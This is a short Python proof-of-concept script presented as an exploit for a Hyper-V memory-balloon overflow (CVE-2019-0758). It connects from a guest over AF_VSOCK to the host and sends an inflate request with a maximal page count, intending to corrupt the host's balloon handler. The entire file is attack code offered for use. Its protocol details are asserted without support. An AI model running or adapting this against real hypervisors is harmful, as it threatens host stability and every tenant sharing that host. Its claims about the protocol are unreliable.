#!/usr/bin/env python3
"""
PoC for Hyper-V VMbus balloon overflow (CVE-2019-0758)

Connects to the Hyper-V vsock endpoint for memory balloon and
sends a request with an oversized page count, overflowing the
host’s balloon handler.
"""

import socket
import struct

# AF_VSOCK = 40 on Linux; HOST_CID 2 is the host
AF_VSOCK        = getattr(socket, "AF_VSOCK", 40)
VMADDR_CID_HOST = 2
BALLOON_PORT    = 0x1F  # Hyper-V Balloon service port

# Hyper-V balloon request struct:
#   uint32_t type;      // e.g. 0x00000001 = inflate
#   uint32_t reserved;
#   uint32_t page_count;
#   uint32_t reserved2;
fmt = "<IIII"
TYPE_INFLATE = 1

def main():
    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    s.connect((VMADDR_CID_HOST, BALLOON_PORT))
    print("[+] Connected to Hyper-V balloon vsock")

    page_count = 0xFFFFFFFF  # oversized to overflow host
    req = struct.pack(fmt, TYPE_INFLATE, 0, page_count, 0)
    print(f"[+] Sending balloon inflate with page_count=0x{page_count:08x}")
    s.sendall(req)
    print("[+] Request sent, host balloon handler may be corrupted")
    s.close()

if __name__ == "__main__":
    main()